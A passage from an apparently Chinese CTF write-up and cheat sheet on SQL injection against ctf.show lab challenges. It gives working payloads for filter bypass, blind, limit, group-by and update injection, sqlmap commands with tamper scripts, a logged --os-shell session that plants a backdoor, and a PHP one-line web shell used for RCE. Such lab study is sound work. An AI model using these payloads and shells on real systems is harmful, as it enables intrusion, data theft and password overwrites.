name;  #&#x2F;&#x2F;执行预定义SQL语句(DEALLOCATE || DROP) PREPARE name;  #&#x2F;&#x2F;删除预定义SQL        语句#字符串定义预处理PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;ET @a &#x3D; 3;SET @b &#x3D; 4;                                                   EXECUTE stmt1 USING @a, @b;#变量定义预处理 SQLSET @s &#x3D; &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;PREPARE stmt2 FROM @s;SET @c &#x3D; 6;ET @d &#x3D; 8;EXECUTE stmt2 USING @c, @d;DEALLOCATE PREPARE stmt2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。 </p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">char(115,101,108,101,99,116)等价于select#因此根据题目意思我们可以构建payloadSET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;xxx&#96;&#39;);PREPARE st from @sqli;EXECUTE st;#PREPARE st from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE st;#prepare p from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute p;#&#x2F;&#x2F;也就是prepare p from select * from ctfsh_ow_flagas;execute p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><h2 id="–data"><a href="#–data" class="headerlink" title="–data"></a>–data</h2><p>–data&#x3D;数据 通过POST发送数据字符串，例如: –data&#x3D;”id&#x3D;1”</p><h2 id="–method"><a href="#–method" class="headerlink" title="–method"></a>–method</h2><p>指定请求类型 </p><p>–method &#x3D;PUT </p><p>当使用PUT请求时要加上Content-Type</p><p><code>--header=&quot;Content-Type:plain/text&quot;</code></p><h3 id="加上Content-Type"><a href="#加上Content-Type" class="headerlink" title="加上Content-Type"></a>加上Content-Type</h3><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string-literal singleline"><span class="token string">"http://3ab9b1ae-c170-40ff-af42-ad033c60ce68.challenge.ctf.show/api/index.php"</span></span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"http://3ab9b1ae-c170-40ff-af42-ad033c60ce68.challenge.ctf.show/sqlmap.php"</span></span> <span class="token operator">--</span>user<span class="token operator">-</span>agent<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"sqlmap"</span></span> <span class="token operator">--</span>method<span class="token operator">=</span>PUT <span class="token operator">--</span><span class="token keyword">data</span><span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"id=1"</span></span> <span class="token operator">--</span>header<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"Content-Type:plain/text"</span></span> <span class="token operator">-</span>D <span class="token string-literal singleline"><span class="token string">"ctfshow_web"</span></span> <span class="token operator">-</span>T <span class="token string-literal singleline"><span class="token string">"ctfshow_user"</span></span> <span class="token operator">--</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="加上Cookie"><a href="#加上Cookie" class="headerlink" title="加上Cookie"></a>加上Cookie</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py <span class="token parameter variable">-u</span> http://ca3f9cf1-8608-4057-bf06-070dcb8894dd.challenge.ctf.show/api/index.php <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"PHPSESSID=99e76r4a13nf0gg1br39ohlhg5;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="加上权限鉴别-设置在访问目标之前访问安全链接"><a href="#加上权限鉴别-设置在访问目标之前访问安全链接" class="headerlink" title="加上权限鉴别(设置在访问目标之前访问安全链接)"></a>加上权限鉴别(设置在访问目标之前访问安全链接)</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py <span class="token parameter variable">-u</span> http://ca3f9cf1-8608-4057-bf06-070dcb8894dd.challenge.ctf.show/api/index.php -safe-url<span class="token operator">=</span><span class="token string">"http://79733793-f03e-4d3a-b82b-db5ee53ef35c.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"PHPSESSID=99e76r4a13nf0gg1br39ohlhg5;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="简单插件编写"><a href="#简单插件编写" class="headerlink" title="简单插件编写"></a>简单插件编写</h3><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string-literal singleline"><span class="token string">"http://4480449f-c1fb-47ab-a2a4-f244b02da199.challenge.ctf.show/api/index.php"</span></span> <span class="token operator">--</span><span class="token keyword">data</span><span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"id=1"</span></span> <span class="token operator">--</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"http://4480449f-c1fb-47ab-a2a4-f244b02da199.challenge.ctf.show/api/getToken.php"</span></span> <span class="token operator">--</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">--</span>tamper<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"space.py,208.py"</span></span> <span class="token operator">--</span>cookie<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"PHPSESSID=9k8plr4bg5iv6o5rf8pcv951s2"</span></span> <span class="token operator">--</span>referer<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"ctf.show"</span></span> <span class="token operator">--</span>method<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"PUT"</span></span> <span class="token operator">--</span>header<span class="token operator">=</span><span class="token string-literal singleline"><span class="token string">"Content-Type:plain/text"</span></span> <span class="token operator">-</span>D <span class="token string-literal singleline"><span class="token string">"ctfshow_web"</span></span> <span class="token operator">-</span>T <span class="token string-literal singleline"><span class="token string">"ctfshow_flaxca"</span></span> <span class="token operator">--</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="前后缀"><a href="#前后缀" class="headerlink" title="前后缀"></a>前后缀</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py <span class="token parameter variable">-u</span> http://b022e7c4-49b3-4c5d-b4fb-70a211fe60b9.challenge.ctf.show/api/index.php -safe-url<span class="token operator">=</span><span class="token string">"http://b022e7c4-49b3-4c5d-b4fb-70a211fe60b9.challenge.ctf.show/api/getToken.php"</span> <span class="token parameter variable">--prefix</span><span class="token operator">=</span><span class="token string">"')"</span> <span class="token parameter variable">--suffix</span><span class="token operator">=</span><span class="token string">"#"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"PHPSESSID=99e76r4a13nf0gg1br39ohlhg5;"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="使用tamper"><a href="#使用tamper" class="headerlink" title="使用tamper"></a>使用tamper</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py <span class="token parameter variable">-u</span> http://8f0bbd3c-f724-49a8-9829-79d01631841a.challenge.ctf.show/api/index.php -safe-url<span class="token operator">=</span><span class="token string">"http://8f0bbd3c-f724-49a8-9829-79d01631841a.challenge.ctf.show/api/getToken.php"</span> <span class="token parameter variable">--prefix</span><span class="token operator">=</span><span class="token string">"')"</span> <span class="token parameter variable">--suffix</span><span class="token operator">=</span><span class="token string">"#"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"PHPSESSID=99e76r4a13nf0gg1br39ohlhg5;"</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"space2comment.py"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="自定义tamper"><a href="#自定义tamper" class="headerlink" title="自定义tamper"></a>自定义tamper</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//对传入的参数进行了过滤</span><span class="token comment">// $id = str_replace('select', '', $id);</span>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一般直接套原来的模板"><a href="#一般直接套原来的模板" class="headerlink" title="一般直接套原来的模板"></a>一般直接套原来的模板</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Replaces space character ('SELECT') with comments 'selselectect'    Tested against:        * Microsoft SQL Server 2005        * MySQL 4, 5.0 and 5.5        * Oracle 10g        * PostgreSQL 8.3, 8.4, 9.0    Notes:        * Useful to bypass weak and bespoke web application firewalls    >>> tamper('SELECT id FROM users')    'selselectect id FROM users'    """</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal<span class="token operator">=</span>retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'SELECT'</span><span class="token punctuation">,</span><span class="token string">'selselectect'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="需要查看详细信息可以使用-v-1-6"><a href="#需要查看详细信息可以使用-v-1-6" class="headerlink" title="需要查看详细信息可以使用 -v(1-6)"></a>需要查看详细信息可以使用 -v(1-6)</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py <span class="token parameter variable">-u</span> http://b280213d-10e6-424c-9b22-d93c60e77812.challenge.ctf.show/api/index.php -safe-url<span class="token operator">=</span><span class="token string">"http://b280213d-10e6-424c-9b22-d93c60e77812.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"PHPSESSID=99e76r4a13nf0gg1br39ohlhg5;"</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"space2comment;selectDoublePass"</span> <span class="token parameter variable">-v</span> <span class="token number">6</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 sqlmap.py <span class="token parameter variable">-u</span> http://a5e0cb60-ddaf-40ec-8d97-45b32fd1ce29.challenge.ctf.show/api/index.php -safe-url<span class="token operator">=</span><span class="token string">"http://a5e0cb60-ddaf-40ec-8d97-45b32fd1ce29.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"PHPSESSID=99e76r4a13nf0gg1br39ohlhg5;"</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"space2chr(0x0a);ctfshow210"</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="–os-shell"><a href="#–os-shell" class="headerlink" title="–os-shell"></a>–os-shell</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">D:<span class="token punctuation">\</span>newDesktop<span class="token punctuation">\</span>工具包<span class="token punctuation">\</span>sqlmap-1.6.8-<span class="token operator"><span class="token file-descriptor important">2</span>></span>python3 sqlmap.py <span class="token parameter variable">-u</span> http://a5e0cb60-ddaf-40ec-8d97-45b32fd1ce29.challenge.ctf.show/api/index.php -safe-url<span class="token operator">=</span><span class="token string">"http://a5e0cb60-ddaf-40ec-8d97-45b32fd1ce29.challenge.ctf.show/api/getToken.php"</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>PUT <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">"id=1"</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">"Content-Type: text/plain"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"PHPSESSID=99e76r4a13nf0gg1br39ohlhg5;"</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span><span class="token string">"space2chr(0x0a);ctfshow210"</span> --os-shell<span class="token function">which</span> web application language does the web server support?<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> ASP<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> ASPX<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> JSP<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> PHP <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token number">4</span><span class="token keyword">do</span> you want sqlmap to further try to provoke the full path disclosure? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> nwhat <span class="token keyword">do</span> you want to use <span class="token keyword">for</span> writable directory?<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> common location<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token string">'/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www'</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> custom location<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> custom directory list <span class="token function">file</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> brute force search<span class="token operator">></span> <span class="token number">2</span>please provide a comma separate list of absolute directory paths: /var/www/html/<span class="token punctuation">[</span><span class="token number">15</span>:57:15<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> unable to automatically parse any web server path<span class="token punctuation">[</span><span class="token number">15</span>:57:15<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> trying to upload the <span class="token function">file</span> stager on <span class="token string">'/var/www/html/'</span> via LIMIT <span class="token string">'LINES TERMINATED BY'</span> method<span class="token punctuation">[</span><span class="token number">15</span>:57:15<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the <span class="token function">file</span> stager has been successfully uploaded on <span class="token string">'/var/www/html/'</span> - http://a5e0cb60-ddaf-40ec-8d97-45b32fd1ce29.challenge.ctf.show:80/tmpunmjc.php<span class="token punctuation">[</span><span class="token number">15</span>:57:15<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> unable to upload the <span class="token function">file</span> through the web <span class="token function">file</span> stager to <span class="token string">'/var/www/html/'</span><span class="token punctuation">[</span><span class="token number">15</span>:57:15<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> backdoor has not been successfully uploaded through the <span class="token function">file</span> stager possibly because the user running the web server process has not <span class="token function">write</span> privileges over the folder where the user running the DBMS process was able to upload the <span class="token function">file</span> stager or because the DBMS and web server sit on different servers<span class="token keyword">do</span> you want to try the same method used <span class="token keyword">for</span> the <span class="token function">file</span> stager? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> y<span class="token punctuation">[</span><span class="token number">15</span>:57:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the backdoor has been successfully uploaded on <span class="token string">'/var/www/html/'</span> - http://a5e0cb60-ddaf-40ec-8d97-45b32fd1ce29.challenge.ctf.show:80/tmpbvgsf.php<span class="token punctuation">[</span><span class="token number">15</span>:57:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> calling OS shell. To quit <span class="token builtin class-name">type</span> <span class="token string">'x'</span> or <span class="token string">'q'</span> and press ENTERos-shell<span class="token operator">></span> <span class="token function">ls</span><span class="token keyword">do</span> you want to retrieve the <span class="token builtin class-name">command</span> standard output? <span class="token punctuation">[</span>Y/n/a<span class="token punctuation">]</span> a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><h3 id="payload（来自sqlmap，二分）"><a href="#payload（来自sqlmap，二分）" class="headerlink" title="payload（来自sqlmap，二分）"></a>payload（来自sqlmap，二分）</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1&#39; AND (SELECT 8076 FROM (SELECT(SLEEP(3)))EOgF) AND &#39;qWVq&#39;&#x3D;&#39;qWVq# 可以用来尝试有无时间盲注1&#39; AND (SELECT 9318 FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema&#x3D;0x63746673686f775f776562 LIMIT 0,1),7,1))&gt;115,0,3)))))imOG) AND &#39;lDVH&#39;&#x3D;&#39;lDVH1&#39; AND (SELECT 5696 FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;0x666c61676161 AND table_schema&#x3D;0x63746673686f775f776562),1,1))&gt;48,0,3)))))CbJP) AND &#39;YqWC&#39;&#x3D;&#39;YqWC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令分析：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#主体：1、(SELECT 9318 FROM (SELECT(SLEEP(3-x2x)))imOG)2、IF(ORD(MID(x3x,7,1))&gt;115,0,3))3、(SELECT IFNULL(CAST(table_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema&#x3D;0x63746673686f775f776562 LIMIT 0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="延时命令"><a href="#延时命令" class="headerlink" title="延时命令"></a>延时命令</h3><h3 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h3><p>下面的函数使用需要控制得当，否则环境会坏</p><h3 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark"></a>benchmark</h3><pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token function">benchmark</span><span class="token punctuation">(</span>100000<span class="token punctuation">,</span> <span class="token function">sha</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="rlike"><a href="#rlike" class="headerlink" title="rlike"></a>rlike</h3><p>此为延时五秒</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) rlike &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select count(*) from information_schema.tables a,information_schema.tables b,information_schema.tables c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>当没有头绪时，进行抓包，发包</p><p><img src="/images/image-20220818175717232-1662567174481.png" alt="image-20220818175717232"></p><h2 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h2><p>MySQL利用procedure analyse()函数优化表结构</p><p>limit 后面跟 procedure analyse() 里面放报错注入</p><p><code>limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),2)</code></p><h2 id="group-by-注入"><a href="#group-by-注入" class="headerlink" title="group by 注入"></a>group by 注入</h2><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token operator">+</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进行时间盲注、或者布尔盲注</p><h2 id="文件注入"><a href="#文件注入" class="headerlink" title="文件注入"></a>文件注入</h2><p>这道题比较骚，我拿扫描器扫描到了有robots.txt</p><p>重置密码后登录，发现需要上传文件，无论上传啥都不行醉了</p><p>文件名注入，下载群里的payload.bin，十六进制的意思是</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">&lt;?=`$_GET[1]`?><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/image-20220820221102200-1662567174481.png" alt="image-20220820221102200"></p><p>因此我们就可以进行rce了</p><p>得到flag</p><h2 id="查看存储过程的函数"><a href="#查看存储过程的函数" class="headerlink" title="查看存储过程的函数"></a>查看存储过程的函数</h2><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">prepare p from 0x73656c656374202a2066726f6d20696e666f726d6174696f6e5f736368656d612e726f7574696e6573;execute p;&#x2F;&#x2F;也就是prepare p from select * from information_schema.routines;execute p;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/images/image-20220820231015395-1662567174481.png" alt="image-20220820231015395"></p><p>使用call 调用一般存储过程</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">call getFlag();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h2><p><img src="/images/image-20220820232539773-1662567174481.png" alt="image-20220820232539773"></p><p>这是一条更新密码的语句，先输入如下payload：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">password&#x3D;1&#39; where 1&#x3D;1#&amp;username&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现的确可以将所有密码改为<code>1</code>：</p><p><img src="https://upload-images.jianshu.io/upload_images/26144645-2ac1bd0b3e209a84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p> 那么因为是有回显的，可以直接将用户名改为我们想要的东西。为什么不直接改密码：因为密码的值被单引号包裹，其中的是字符串不是sql语句。 payload如下：</p><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">password<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">,</span>username<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">select</span> flagas <span class="token keyword">from</span> flaga <span class="token punctuation">)</span> <span class="token keyword">where</span> <span class="token number">1</span>#<span class="token operator">&amp;</span>username<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/26144645-2cb97f5d4743725e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p><p><img src="/images/image-20220821133406669-1662567174497.png" alt="image-20220821133406669"></p><h2 id="过滤了‘"><a href="#过滤了‘" class="headerlink" title="过滤了‘"></a>过滤了‘</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//查表名:<span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token punctuation">\</span><span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>,username<span class="token operator">=</span><span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token comment">#</span>//查列名：因为过滤了单引号，所以使用16进制字符串表示表名<span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token punctuation">\</span><span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>,username<span class="token operator">=</span><span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where <span class="token assign-left variable">table_name</span><span class="token operator">=</span>0x666c6167323361<span class="token punctuation">)</span><span class="token comment">#</span>//查数据<span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token punctuation">\</span><span class="token operator">&amp;</span><span class="token assign-left variable">username</span><span class="token operator">=</span>,username<span class="token operator">=</span><span class="token punctuation">(</span>select flagass23s3 from flag23a<span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="无列名，表名注入（过滤了or-information不可用）"><a 